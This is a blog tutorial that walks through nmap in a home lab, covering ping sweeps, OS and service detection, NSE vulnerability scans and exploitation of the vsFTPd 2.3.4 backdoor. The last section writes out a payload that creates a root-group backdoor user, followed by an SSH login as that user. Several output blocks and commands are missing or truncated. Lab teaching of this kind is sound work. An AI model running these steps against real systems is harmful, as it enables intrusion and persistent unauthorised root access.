Hackers use `nmap` to enumerate details about their potential targets. It can identify open ports, running services, and which software versions are in use. Yet, it can also be used to determine the vulnerability of a system and even exploit it. In this blog post, I will demonstrate how to use `nmap` and how it can be observed.

### Setup
To follow along, I recommend hosting two Virtual Machines (VMs) on your computer. I personally used a [Metasploitable Linux](https://metasploit.help.rapid7.com/docs/metasploitable-2) VM and [Kali Linux](https://www.kali.org) VM via [VirtualBox](https://www.virtualbox.org). 
* Metasploitable Linux VM: `192.168.56.4`
* Kali Linux VM: `192.168.56.5`

## Host Discovery
<font color='red'>Red Team</font>
To perform a Ping Sweep of a specific subnet, use the command sentence below (include `-sn` in order to maintain a low profile).  
> This option tells Nmap not to do a port scan after host discovery, and only print out the available hosts that responded to the host discovery probes.

```bash
nmap -sn 192.168.56.0/24
```
```python
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-02 09:02 EST

```

<font color='blue'>Blue Team</font>
Since we are part of the target subnet and port scanning was turned-off, our *Host Discovery* probes will appear as a series of ARP requests. 
```bash
tcpdump
```
```python
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes

## OS Fingerprinting
<font color='red'>Red Team</font>
With a handful of targets already identified, we can mute Host Discovery and run a OS Fingerprint scan against a single node of interest. 
> Disabling host discovery with -Pn causes Nmap to attempt the requested scanning functions against every target IP address specified.<br>
<br>
For machines on a local ethernet network, ARP scanning will still be performed (unless --disable-arp-ping or --send-ip is specified) because Nmap needs MAC addresses to further scan target hosts. In previous versions of Nmap, -Pn was -P0 and -PN. <br>
<br>
Nmap sends a series of TCP and UDP packets to the remote host and examines practically every bit in the responses. After performing dozens of tests such as TCP ISN sampling, TCP options support and ordering, IP ID sampling, and the initial window size check, Nmap compares the results to its nmap-os-db database of more than 2,600 known OS fingerprints and prints out the OS details if there is a match. 

```bash
nmap -Pn --disable-arp -O 192.168.56.4
```

## Service Detection
<font color='red'>Red Team</font>
> When doing vulnerability assessments (or even simple network inventories) of your companies or clients, you really want to know which...servers and versions are running. Having an accurate version number helps dramatically in determining which exploits a server is vulnerable to. Version detection helps you obtain this information.<br>
<br>
After TCP and/or UDP ports are discovered using one of the other scan methods, version detection interrogates those ports to determine more about what is actually running. The nmap-service-probes database contains probes for querying various services and match expressions to recognize and parse responses. 

As before, we can keep the amount of traffic on the network to a minimum by only specifying open TCP ports of interest during our Service Detection scan. 
```bash
nmap -Pn --disable-arp -sV -p T:21,22,23,80,3306 192.168.56.4
```
```python
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-02 09:31 EST

Nmap done: 1 IP address (1 host up) scanned in 6.60 seconds
```
Service Detection scans should also be performed against UDP ports. In the following example, I ran a scan using the Top 5 UDP ports found open as input. For this specific option, you can increase/decrease the number as desired. For instance, use `--top-ports 100` to probe the Top 100 TCP (`-sT` or `-sS`) or UDP (`-sU`) ports. 
```bash
nmap -Pn --disable-arp --top-ports 5 -sUV 192.168.56.4
```
To scan TCP & UDP ports at the same time, run something similar to the command sentence below.
```bash
nmap -Pn --disable-arp -sTUV --top-ports 5 192.168.56.4
```

## Vulnerability Assessment & Exploitation
In 2015, the Nmap Scripting Engine (NSE) was introduced which then enabled Nmap to be used for Vulnerability Assessments & Exploitation. 
> It allows users to write (and share) simple scripts to automate a wide variety of networking tasks.
<br>
NSE scripts define a list of categories they belong to. Currently defined categories are auth, broadcast, brute, default. discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln.

Most NSE scripts are saved in the directory below. They, like `nmap`, are developed in the Lua programming language and structured using a Fields, Rules, and Action format.  
```bash
ls /usr/share/nmap/scripts/
```
```bash
acarsd-info.nse		http-grep.nse                   nntp-ntlm-info.nse
address-info.nse        http-headers.nse                nping-brute.nse
afp-brute.nse           http-huawei-hg5xx-vuln.nse	nrpe-enum.nse
<...snipped...>
```

<font color='blue'>Blue Team</font>
To run available NSE scripts under the `vuln` category, execute the following command sentence.
```bash
nmap --script vuln 192.168.56.4
```
The expected output will identify what common exploits your target node is vulnerable to. The awesome part about the NSE is you can extend your analysis through homebrewed and publicly shared scripts.

To learn more about an on-system NSE script, use the `--script-help` option. 
```bash

  Tests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04
  (CVE-2011-2523). This script attempts to exploit the backdoor using the
  innocuous <code>id</code> command by default, but that can be changed with
  the <code>exploit.cmd</code> or <code>ftp-vsftpd-backdoor.cmd</code> script
  arguments.

Here, we will only run the `ftp-vsftpd-backdoor` NSE script against our target's FTP port (`-p21`). The results will essentially be the same as our `--script vuln` scan yet, without information about other ports or services.

Finally, NSE scripts can take multiple arguments from standard input. In our previous `ftp-vsftpd-backdoor` scan, the `id` shell command was executed as the `cmd` argument. Corresponding output suggests the exploit in question provides root-level access. We will explore this in a moment. First, let's try something a little more cliche. 

This command sentence has been spread across two lines for readability.

NSE scripts can also take arguments from a file, which helps with crafting more elaborate probing, analysis, and exploitation. In this scan, we are going to use a file to define `useradd` as our `cmd` argument and attempt to establish persistent access on our target.  
```bash
echo 'cmd="useradd -g root -s /bin/bash ghost && echo ghost:boo | chpasswd"' \
> /hauntingYou.txt
```
Ensure to use the absolute file-path to your args file for your scan (especially if it saved somewhere wonky).

Since there is typically no output for a successful `useradd` execution, we can assume it worked and try to login remotely. 
```bash
ssh ghost@192.168.56.4
```
```bash
ghost@192.168.56.4s password: # according to our arg file, password = 'boo'
```

And we're in! Running the `id` shell command as before now tells us we have root-level access as `ghost`. Spooky!
```
ghost@metasploitable:/$ id

```
